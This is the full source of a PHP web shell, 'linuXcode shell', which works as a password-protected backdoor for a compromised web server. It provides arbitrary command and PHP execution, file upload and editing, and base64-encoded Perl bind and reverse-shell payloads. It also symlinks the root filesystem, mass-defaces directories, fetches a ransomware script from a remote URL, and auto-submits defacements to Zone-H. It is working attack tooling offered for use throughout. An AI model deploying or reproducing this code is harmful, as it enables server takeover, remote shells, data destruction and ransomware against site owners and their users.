<?php
/**********************************************
*               "linuXcode.org"               *
----------------------------------------------*
* Author  : shutdown57 a.k.a alinko kun       *
* Contact : alinkokomansuby@gmail.com         *
* Gretting: You and Who use this!             *
*          -[ copyright (c) 2k17 ]-           *                 
**********************************************/
session_start();
ini_set('max_execution_time',60);
$s57_paswot="bGludXhjb2Rl";
function shutdown57_login() {
	echo "<center><h1>:-[ linuXcode.org ]-:</h1>";
	echo "<p>^[ linuXcode shell - version 2017 ]^</p>";
	echo  "<form method='post'><input type='password' name='pass' placeholder='password here' style='margin:top:300px;border:1px solid #000;color:#f00;width:300px'></form></center>";
    exit;
}
 
 
if( !isset($_SESSION[base64_encode($_SERVER['HTTP_HOST'])] ))
    if( empty($s57_paswot) ||
        ( isset( $_POST['pass'] ) && (base64_encode($_POST['pass']) == $s57_paswot) ) )
        $_SESSION[base64_encode($_SERVER['HTTP_HOST'])] = true;
    else
        shutdown57_login();
function a_cmd($command){
	if(function_exists('system')){
		$a_cmd=@system($command);
	}elseif (function_exists('exec')) {
		$a_cmd=@exec($command);
	}elseif (function_exists('shell_exec')) {
		$a_cmd=@shell_exec($command);
	}elseif (function_exists('passthru')) {
		$a_cmd=@passthru($command);
	}
	@ob_start();
	$a_cmd.=@ob_get_contents();
	return $a_cmd;
}
function a_upl($tmp,$file){
	if(function_exists('move_uploaded_file')){
		$a_upl=@move_uploaded_file($tmp,$file);
	}elseif (function_exists('copy')) {
		$a_upl=@copy($tmp,$file);
	}
	return $a_upl;
}
function a_getx($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
function a_fsize($files){
			$size = filesize($files)/1024;
			$size = round($size,3);
			if($size > 1024) {
				$size = round($size/1024,2). 'MB';
			} else {
				$size = $size. 'KB';
			}
			return $size;
}
function a_own($path){
	if(function_exists('posix_getpwuid')) {
					$downer = @posix_getpwuid(fileowner($path));
					$downer = $downer['name'];
				} else {
					//$downer = $uid;
					$downer = fileowner($path);
				}
			return $downer;
}
function a_group($path){
	if(function_exists('posix_getgrgid')) {
					$dgrp = @posix_getgrgid(filegroup($path));
					$dgrp = $dgrp['name'];
				} else {
					$dgrp = filegroup($path);
				}
				return $dgrp;
}
function a_sperm($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
function a_hdd($s) {
	if($s >= 1073741824)
	return sprintf('%1.2f',$s / 1073741824 ).' GB';
	elseif($s >= 1048576)
	return sprintf('%1.2f',$s / 1048576 ) .' MB';
	elseif($s >= 1024)
	return sprintf('%1.2f',$s / 1024 ) .' KB';
	else
	return $s .' B';
}
function a_download($file){
	 @ob_clean();
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    return readfile($file);
    exit;
}
function a_rmdir($d){
		if(!rmdir($d)){
		$s=scandir($d);
		foreach ($s as $ss) {
			if(is_file($d."/".$ss)){
				if(unlink($d."/".$ss)){
					rmdir($d);
					}
			}
			if(is_dir($d."/".$ss)){
				rmdir($d."/".$ss);
				rmdir($d);
				
			}
		}
	}
	}
function a_gantipass($old,$new){
	$file=getcwd()."/".$_SERVER['PHP_SELF'];
	$getc=file_get_contents($file);
	$pw=str_replace("".$old."","".$new."",$getc);
	$fp=fopen($file,"w");
	return fwrite($fp,$pw);
	fclose($fp);

}
// started alinko here
if(empty($_GET['o'])&&empty($_GET['d'])){
	$d=getcwd();
}else{
	if(!empty($_GET['o'])){
		$d=$_GET['o'];
	}else{
		if(!empty($_GET['d'])){
			if(file($_GET['d'])){
				$d=dirname($_GET['d']);
			}else{
				$d=$_GET['d'];
			}
		}
	}
}
if(function_exists('scandir')){
$s=@scandir($d);
}else{
echo "<h1><font color=red> SCANDIR(); FUNCTIONS HAS BEEN DISABLED IN THIS WEBSHIT</font></h1>";
}
echo "<html><head><title>linuXcode.org - ".$_SERVER['HTTP_HOST']."</title>";
echo "
<style type=\"text/css\">
@import url('https://fonts.googleapis.com/css?family=Josefin+Sans');
*{font-family:'Josefin Sans',cursive;}
	body{background:black;color:#fff;}.a_exp{border:1px solid #fff;border-collapse: collapse;}.a_exp tr:hover{background:blue;}a{text-decoration: none;color:#fff;}.a_exp a{color:#fff;}.a_exp a:hover{text-decoration: underline;}textarea,input,select{color:#fff;border:1px solid  blue;background: transparent;}li{list-style: none;display: inline-block;}li a{color:#fff;text-decoration: none;background:#333;padding:3px;margin:3px;}li a:hover{color:#fff;background:blue;text-decoration: none;}thead{background:#333;color:#fff;}a:hover{text-decoration: underline;}.a_phpinfo{background:#000;color:#fff;border:1px solid #fff;text-align:center;}.a_phpinfo th,.a_phpinfo tr,.a_phpinfo td{border-collapse:collapse;border:1px solid blue;}option{background:#000;color:blue;border:0;}
</style>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
$sm= ini_get('safe_mode') ? "<font color=lime> ON<?font>" : "<font color=grey> OFF</font>";
$mysql= function_exists('mysql_connect')?"<font color=lime> ON</font>":"<font color=grey> OFF</font>";
$url_fp =ini_get('url_fopen')?"<font color=lime> ON</font>":"<font color=grey> OFF</font>";
$curl=function_exists('curl_init')?"<font color=lime> ON</font>":"<font color=grey> OFF</font>";
$df=ini_get('disable_functions') ? substr(ini_get('disable_functions'),0,50).",etc..." : "<font color=grey> NONE</font>";
echo "
<table style='width:100%;border:1px solid #fff;background:url(http://1.bp.blogspot.com/-usVrT4Mr7GE/WH8G6HTXFtI/AAAAAAAAAcE/AdYRFrzLkTMDrsxAU4AXqdZg-mF4KmFZQCK4B/s1600/logo.png)no-repeat center;'><tr><td>
<pre style='font-size:13px;'>
SERVER SOFTWARE : ".$_SERVER['SERVER_SOFTWARE']."
UNAME : ".php_uname()."
HOSTNAME : ".$_SERVER['HTTP_HOST']."
IP SERVER : ".gethostbyname($_SERVER['HTTP_HOST'])." | YOUR IP : ".$_SERVER['REMOTE_ADDR']." 
User: <font color=lime>".$user."</font> (".$uid.") Group: <font color=lime>".$group."</font> (".$gid.")
PHP version : ".phpversion()."-[<a href='?f=phpinfo&d=$d'>PHPINFO</a>]
HDD Free Space: ".a_hdd(diskfreespace($d))."
CURL:".$curl."|safemode:".$sm."|URL FOPEN:".$url_fp."|MySQL:".$mysql."
DISABLE FUNCTIONS :".$df."</pre>";
echo "</td><td>";
echo "<ul>";
echo "<li> <a href='?x'>Home</a></li>";
echo "<li> <a href='?f=upl&d=".$d."'>Upload</a></li>";
echo "<li> <a href='?f=sh&d=".$d."'>Shell</a></li>";
echo "<li> <a href='?f=net&d=".$d."'>Network</a></li>";
echo "<li> <a href='?f=cp&d=".$d."'>Change Password</a></li>";
echo "<li> <a href='?f=out&d=".$d."'>LogOut</a></li><br><br>";
echo "<li> <a href='?f=mas&d=".$d."'>Mass Deface</a></li>";
echo "<li> <a href='?f=sym&d=".$d."'>Symlink</a></li>";
echo "<li> <a href='?f=zh&d=".$d."'>Zone-H</a></li>";
echo "<li> <a href='?f=php&d=".$d."'>PHP</a></li>";
echo "<li> <a href='?f=adm&d=".$d."'>Adminer</a></li>";
echo "<li> <a href='?f=rsmw&d=".$d."'>Ransomeware</a></li>";
echo "</ul></td></tr><tr><td>";
echo "<font color=blue>Current dir :";
$d=str_replace('\\','/',$d);
$path = explode('/',$d);
foreach($path as $id=>$curdir){
if($curdir == '' && $id == 0){
$a = true;
echo '<a href="?o=/">/</a>';
continue;
}
if($curdir == '') continue;
echo '<a href="?o=';
for($i=0;$i<=$id;$i++){
echo "$path[$i]";
if($i != $id) echo "/";
}
echo '">'.$curdir.'</a>/';
}
$pwd=str_replace('\\','/',getcwd());
$a_w=(is_writable($d)) ? "#<font color=lime>W</font>" : "#<font color=red>R</font>";
echo "</font> ($a_w) </td><td><form method='get'><label for='o'>Go to dir :</label><input type='text' name='o' value='$d' style='border:0;'></form><td></table>";
echo" <br><hr>";
if(@empty($_GET['f'])){
echo "<form method='POST'>";
echo "<table  style='width:100%;' class='a_exp'><thead><th>^</th><th>Name</th><th>Size</th><th>Type</th><th>Date Modified</th><th>Own:Group</th><th>Permission</th><th>Actions</th></thead>";
echo "<tbody><tr><td>@</td><td><a href='?o=".dirname($d)."'>..</a></td><td>#!</td><td>#!</td><td>#!</td><td>#!</td><td>#!</td><td><a href='?f=mkdir&d=".$d."'>newDir</a> / <a href='?f=newfile&d=".$d."'>newFiles</a></td></tr>";
foreach ($s as $dir) {
	if(!is_dir("$d/$dir")||$dir=='.'||$dir=='..')continue;
	$a_ftype=@mime_content_type ("$d/$dir");
	$a_fdm=@date("D m Y g:i:s", filemtime("$d/$dir"));
	$a_own=@a_own("$d/$dir");
	$a_gro=@a_group("$d/$dir");
	$a_sperm=@a_sperm("$d/$dir");
	echo "<tr><td><input type='checkbox' name='cekd[]' value='".$d."/".$dir."'></td><td><a href='?o=".$d."/".$dir."'>".$dir."</a></td><td>--</td>";
	echo "<td>".$a_ftype."</td><td>".$a_fdm."</td><td>".$a_own.":".$a_gro."</td><td>".$a_sperm."</td>";
	echo "<td>";
	echo "<a href='?f=rename&d=".$d."/".$dir."'>rename</a> / <a href='?f=rmdir&d=".$d."/".$dir."'>delete</a>";
	echo "</td></tr>";
}
foreach ($s as $fil) {
	if(!is_file("$d/$fil")||$fil=='.'||$fil=='..')continue;
		$a_fsize=@a_fsize("$d/$fil");
		$a_ftype=@mime_content_type("$d/$fil");
		$a_fdm=@date("D m Y g:i:s", filemtime("$d/$fil"));
	    $a_own=@a_own("$d/$fil");
	    $a_gro=@a_group("$d/$fil");
	    $a_sperm=@a_sperm("$d/$fil");
	echo "<tr><td><input type='checkbox' name='cekf[]' value='".$d."/".$fil."'></td><td><a href='?f=vf&d=".$d."/".$fil."'>".$fil."</a></td><td>".$a_fsize."</td>";
	echo "<td>".$a_ftype."</td><td>".$a_fdm."</td><td>".$a_own.":".$a_gro."</td><td>".$a_sperm."</td>";
	echo "<td>";
	echo "<a href='?f=rename&d=".$d."/".$fil."'>rename</a> / <a href='?f=edit&d=".$d."/".$fil."'>edit</a> / <a href='?f=rm&d=".$d."/".$fil."'>delete</a> / <a href='?f=dl&d=".$d."/".$fil."'>dl</a>";
	echo "</td></tr>";
}
echo "<tr><td colspan='8'>";
echo "<select name='select' style='width:400px'>
<option> action selected files</option>
<option value='del'>delete</option>
<option value='copy'>Copy</option>";
if(function_exists('system')){
echo"
<option value='unzip'>unzip </option>
<option value='tar'>ekstrak .tar.* </option>
";
}
echo"
</select>
<input type='submit' name='sbmt' value='>>' >
</form>";
echo"</td></tr>";
echo "</tbody></table>";
if(isset($_POST['sbmt'])){
	$file=$_POST['cekf'];
	$dir=$_POST['cekd'];
	if($_POST['select']=='del'){
		if($_POST['cekf']){
			
			foreach ($file as $cekf) {
				if(unlink($cekf)){
					echo"<meta http-equiv='refresh' content=0;url=>";
				}
			}
		}
	if($_POST['cekd']){
		
		foreach ($dir as $cekd) {
		if(a_rmdir($cekd)){
			echo"<meta http-equiv='refresh' content=0;url=>";
		}
		}}
		}elseif ($_POST['select']=='copy') {
		$_SESSION['copy']=$_POST['cekf'];
		echo "<meta http-equiv='refresh' content=0;url=?f=copy&d=$d>";
		}elseif ($_POST['select']=='unzip') {
		$uz=$_POST['cekf'];
		foreach($uz as $unzip){
		system('unzip '.$unzip);
	}
		}elseif ($_POST['select']=='tar') {
		$tar=$_POST['cekf'];
		foreach($tar as $gz){
		system('tar -xvf '.$gz);
		}
		}
	}
}else{
	$a_f=$_GET['f'];
	if($a_f == "vf"){
		$a_ctext="<textarea readonly style='width:100%;height:700px'>".htmlspecialchars(file_get_contents($_GET['d']))."</textarea>";
		if (preg_match("/text/",mime_content_type($_GET['d']))) {
			echo $a_ctext;
		}else{
			a_download($_GET['d']);
		}
	}elseif ($a_f == "dl") {
		a_download($_GET['d']);
	}elseif ($a_f == "rename") {
		echo "<center><form method='POST'><label for='rename'> Newname :</label>";
		echo"<input type='text' name='rename' value='".basename($_GET['d'])."' style='width:500px;'><input type='submit' value='>>' name='srename'></form></center>";
		if (isset($_POST['srename'])) {
			if(rename(urldecode($_GET['d']),dirname($_GET['d'])."/".htmlspecialchars($_POST['rename']))){
				echo "<script>window.location.href='?o=".dirname($_GET['d'])."'</script>";
			}else{
				echo "<font color=red><b><center> PERMISSION DENIED </b></center></font>";
			}
		}
	}elseif ($a_f == "edit") {
	echo "<center><form method='POST'><textarea style='width:90%;height:600px;' name='fedit'>".htmlspecialchars(file_get_contents($_GET['d']))."</textarea><br>";
	echo "<label for='fname'>save as:</label>";
	echo "<input type='text' style='width:600px;' value='".$_GET['d']."' name='fname' ><input type='submit' name='sf' value='save'></form></center>";
	if(isset($_POST['sf'])){
		$f=@fopen($_POST['fname'],"w");
		if (@fwrite($f,$_POST['fedit'])) {
			echo "<script>window.location.href='?o=".dirname($_GET['d'])."'</script>";
		}else{
			echo "<font color=red><b><center> PERMISSION DENIED </b></center></font>";
		}
	}
	}elseif ($a_f == "rm") {
		if(unlink($_GET['d'])){
			echo "<script> window.location.href='?o=".dirname($_GET['d'])."'</script>";
		}else{
			echo "<font color=red><b><center> PERMISSION DENIED </b></center></font>";
		}
	}elseif ($a_f == "rmdir") {
		if(@a_rmdir($_GET['d'])){
			echo "<script> window.location.href='?o=".dirname($_GET['d'])."'</script>";
		}else{
			echo "<script> window.location.href='?o=".dirname($_GET['d'])."'</script>";
		}
	}elseif ($a_f == "mkdir") {
		echo "<center><form method='POST'><label for='nfolder'>New Directory :</label>";
		echo "<input type='text' name='nfolder' value='newfolder_45' style='width:500px'><input type='submit' name='sf' value='>>'></form></center>";
		if(isset($_POST['sf'])){
			if(@mkdir($_POST['nfolder'])){
				echo "<script> window.location.href='?o=".$_GET['d']."'</script>";
			}else{
				echo "<font color=red><b><center> PERMISSION DENIED </b></center></font>";
			}
		}
	}elseif ($a_f == "newfile") {
	echo "<center><form method='POST'><textarea style='width:90%;height:600px;' name='fedit'>// newfile 1945 shell</textarea><br>";
	echo "<label for='fname'>save as:</label>";
	echo "<input type='text' style='width:600px;' value='1945_newfile.php' name='fname' ><input type='submit' name='sf' value='save'></form></center>";
	if (isset($_POST['sf'])) {
		$f=@fopen($_GET['d']."/".$_POST['fname'],"w");
		if(@fwrite($f,$_POST['fedit'])){
			echo "<script> window.location.href='?o=".$_GET['d']."'</script>";
		}else{
			echo "<font color=red><b><center> PERMISSION DENIED </b></center></font>";
		}
	}
	}elseif ($a_f == "upl") {
	$a_w_r=(is_writable(getcwd())) ? "<font color=lime>".getcwd()."</font>" : "<font color=red>".getcwd()."</font>";
	$a_w_d=(is_writable($_GET['d'])) ? "<font color=lime>".$_GET['d']."</font>" : "<font color=red>".$_GET['d']."</font>";
	echo "<center><table><tr><td><form method='POST' enctype='multipart/form-data'>";
	echo "<label for='ufile'>Upload files :</label><input type='file' name='ufile' style='width:300px;border:0;'></td></tr>";
    echo "<tr><td><label for='droot'>Upload to : </label>";
	echo "<input type='radio' name='droot' value='".getcwd()."'> <i>".$a_w_r."</i>";
	echo "<input type='radio' name='droot' value='".$_GET['d']."' checked><i>".$a_w_d."</i></td></tr>";
	echo "<tr><td><input type='submit' value='xXx Upload? xXx' style='width:100%;'></form></td></table></center>";
	if(!empty($_FILES['ufile']['tmp_name'])){
		$a_diru=$_POST['droot']."/".$_FILES['ufile']['name'];
		if(a_upl($_FILES['ufile']['tmp_name'],$a_diru)){
			echo "<script>alert('Upload done!!');</script>";
			echo "<center><b><i>Uploaded to -> ".$a_diru."</i></b></center>";
		}else{
			echo "<center><b><i>Can't Upload files~~</i></b></center>";
		}
	}
	}elseif ($a_f == "sh") {
	$a_val=(empty($_POST['cmd'])) ? "" : $_POST['cmd'];
	echo "<center><div style='border-bottom:1px solid #fff;'><form method='POST'><label for='cmd'>1945@".$_SERVER['HTTP_HOST'].": ".$_GET['d']." \$ </label>";
	echo "<input type='text' name='cmd' value='".$a_val."' style='width:600px;border:0;'></form></center>";
	if(isset($_POST['cmd'])){
		if(preg_match("/^cd/",$_POST['cmd'])){
			$a_direct=explode(" ",$_POST['cmd']);
			echo "<script>window.location.href='?o=".$a_direct[1]."'</script>";
		}else{
			echo "<center><pre><textarea style='width:80%;height:600px;resize:none;' readonly>";
			@a_cmd($_POST['cmd']);
		    echo "</textarea></pre></center>";
		}
	}

	}elseif ($a_f == "net") {
	echo "<center><form method='post'>";
	echo "<table><tr><td colspan='2'><u>Bind Port:</u> <br>PORT: <input type='text' placeholder='port' name='port_bind' value='1945' style='width:80%;'><input type='submit' name='sub_bp' value='>>'></form></td></tr>";
	echo "<tr><td><form method='post'><u>Back Connect:</u> <br>Server: <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'></td><td>&nbsp;&nbsp;
	PORT: <input type='text' placeholder='port' name='port_bc' value='1945'><input type='submit' name='sub_bc' value='>>'>
	</form></td></tr></table>";
	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
	if(isset($_POST['sub_bp'])) {
		$f_bp = fopen("/tmp/bp.pl", "w");
		fwrite($f_bp, base64_decode($bind_port_p));
		fclose($f_bp);

		$port = $_POST['port_bind'];
		$out = @a_cmd("perl /tmp/bp.pl $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".a_cmd("ps aux | grep bp.pl")."</pre>";
		unlink("/tmp/bp.pl");
	}
	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
	if(isset($_POST['sub_bc'])) {
		$f_bc = fopen("/tmp/bc.pl", "w");
		fwrite($f_bc, base64_decode($back_connect_p));
		fclose($f_bc);

		$ipbc = $_POST['ip_bc'];
		$port = $_POST['port_bc'];
		$out = a_cmd("perl /tmp/bc.pl $ipbc $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".a_cmd("ps aux | grep bc.pl")."</pre>";
		unlink("/tmp/bc.pl");
	}
	}elseif ($a_f == "out") {
		session_destroy();
		echo "<script>window.location.href='?a=croted'</script>";
	}elseif ($a_f == "copy") {
	$kopi=$_SESSION['copy'];
	echo "<center><form method='post'>";
	foreach($kopi as $cp){
		echo "Filename :<input type='text' name='kopi[]' value='$cp' > <br>";	
	}
	echo " Copy to : <input type='text' name='dst' value='$d'><input type='submit' value='>>' name='sbmt'></form>";
	if(isset($_POST['sbmt'])){
		$kopi=$_POST['kopi'];
		$dst=$_POST['dst'];
		foreach($kopi as $copi){
		$kopied=$dst."/".basename($copi);
		if(copy($copi,$kopied)){
			echo " $copi COPIED TO $kopied <br>";
		}
		}
	}
	}elseif ($a_f == "phpinfo") {
	@ob_start();
	@eval("phpinfo();");
	$buff = @ob_get_contents();
	@ob_end_clean();	
	$awal = strpos($buff,"<body>")+6;
	$akhir = strpos($buff,"</body>");
	echo "<center><div class='a_phpinfo'>".substr($buff,$awal,$akhir-$awal)."</div></center>";
	}elseif ($a_f == "cp") {
		if(empty($_POST['change'])){
	echo "<center><h1>Change Password</h1><table><tr><td><form method='post'>";
	echo "<input type='hidden' name='old' value='".$s57_paswot."' >";
	echo "New password     </td><td><input type='password' name='new' ></td></tr><tr><td>";
	echo "Confirm password </td><td><input type='password' name='neww' ></td></tr><tr><td colspan='2'>";
	echo "<input type='submit' name='change' value='change password'></form></td></tr></table></center>";
}else{
	if($_POST['new']==$_POST['neww']){
	if(a_gantipass($_POST['old'],base64_encode($_POST['new']))){
		echo "<script>alert('password berhasil di ubah!'); window.location.href='?f=out&pass=".base64_encode($_POST['new'])."';</script>";
	}else{
		echo "<script>alert('tidak bisa ubah password?');</script>";
	}
	}else{
		echo "<script>alert('Password doesn\'t match!')</script>";
	}
	}
}elseif ($a_f == "sym") {
	if(!file_exists('linuXcode.org')){
	if(function_exists('system')){
		system('ln -s / linuXcode.org');
			echo "<br><br><h3> Created Symbolic Link Done!</h3><br> <b><a href='linuXcode.org' target='_blank'>Klik Disini Mhanx</a>";
	}
	else{
		echo "<h1> FUNCTION SYSTEM() NOT FOUND IN THIS SERVER";
	}
}else{
	echo "<center><h1>Symbolic Link Created <a href='linuXcode.org' target='_blank'>in here</a></h1>";
	echo "<a href='?f=rmsym'>REMOVE Symbolic Link</a>";
}
}elseif ($a_f == "rmsym") {
	system('rm -rf linuXcode.org');
	echo"<script>window.location.href='?'</script>";
}elseif ($a_f == "php") {
	echo "<center><h1>PHP EVAL</h1><form method='POST'><textarea name='php_e' style='width:90%;height:400px;resize:none;' onchange='this.form.submit()'></textarea><br><input type='submit' value='Eval mhanx'></form></center>";
	if(isset($_POST['php_e'])){
		echo "<hr>";
		@eval($_POST['php_e']);
	}
}elseif ($a_f == "rsmw") {
	if(a_getx("https://raw.githubusercontent.com/bug7sec/Ransomware/master/v2/AwesomeWare.php","AwesomeWare.php")){
		echo "<center><h1>AwesomeWare Created!</h1>";
		echo "<h2><a href='AwesomeWare.php' target='_blank'>Click here</a></h2></center>";
	}else{
		echo "<center><h1> Can't Create Ransomware </h1></center>";
	}
}elseif ($a_f == "adm") {
	if(a_getx("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")){
		echo "<center><h1> Adminer Created !</h1>";
		echo "<h2><a href='adminer.php' target='_blank'>Click Here</a></h2></center>";
	}else{
		echo "<center><h1>Can't Create Adminer</h1></center>";
	}
}elseif ($a_f == "mas") {
	echo'<center>
	<h1>  Mass deface </h1>
	<small> Original Script by indoXploit </small>';
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe Sabun:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$_GET[massdeface]' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>JAYALAH INDONESIAKU</textarea><br>
	<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
	</form></center>";
	}
}elseif ($a_f == "zh") {
echo"<center><h1> Zone-H Mass Notifer </h1>";
echo "<form method='post'>";
echo "<input type='text' name='depecer' style='width:500px' placeholder='defacer'><br>";
echo "<textarea name='url'  placeholder='http://linuxcode.org' style='width:500px;height:300px;'></textarea><br>";
echo "<input type='submit' name='go' value='subMitt' ></form>";
$url = explode("\r\n", $_POST['url']);
$go = $_POST['go'];
function kirim($target,$hacker) {
	$ch = curl_init();
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		  curl_setopt($ch, CURLOPT_URL, "http://zone-h.org/notify/single");
		  curl_setopt($ch, CURLOPT_POST, true);
		  curl_setopt($ch, CURLOPT_POSTFIELDS, array(
		  	"defacer" => $hacker,
		  	"domain1" => $target,
		  	"hackmode" => "1",
		  	"reason" => "1",
		  	));
	$res = curl_exec($ch);
		  curl_close($ch);
	return preg_match("/<font color=\"red\">OK<\/font><\/li>/", $res);
}
if($go) {
	foreach($url as $sites) {
		if(kirim($sites,$_POST['depecer'])) {
			echo "<br>[ OK ] => $sites <br>";
		} else {
			echo "<br>[ ERROR ] => $sites <br>";
		}
	}
}
}
}
echo "<center><footer style='margin-top:100px;font-size:13px;background:blue;color:#fff;width:100%;'>copyright &copy; ".date('Y')." <a href='http://linuxcode.org' target='_blank'>linuXcode.org</a> - alinko</footer></center>";